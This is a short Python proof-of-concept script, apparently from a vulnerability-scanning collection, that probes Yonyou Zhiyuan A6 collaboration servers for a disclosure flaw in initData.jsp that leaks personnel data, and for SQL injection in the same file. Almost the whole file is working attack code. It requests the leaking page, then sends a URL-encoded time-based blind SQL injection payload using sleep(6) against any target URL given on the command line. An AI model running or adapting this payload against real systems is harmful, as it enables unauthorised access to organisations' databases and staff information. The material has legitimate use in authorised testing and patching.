#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统敏感信息泄露&SQL注射
referer: http://www.wooyun.org/bugs/wooyun-2015-0107543
author: Lucifer
description: 用友致远A6 /yyoa/common/selectPersonNew/initData.jsp?trueName=1文件存在敏感信息泄露,并且存在SQL注入漏洞。
'''
import sys
import time
import requests
import warnings
def run(url):
        result = ['用友致远A6协同系统敏感信息泄露&SQL注射','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/yyoa/common/selectPersonNew/initData.jsp?trueName=1"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"personList" in req.text and r"new Person" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
                return result

            vulnurl = url + "/yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%286%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29>64%20AND%20%27%25%27%3D%27"
            start_time = time.time()
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1] = vulnurl
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

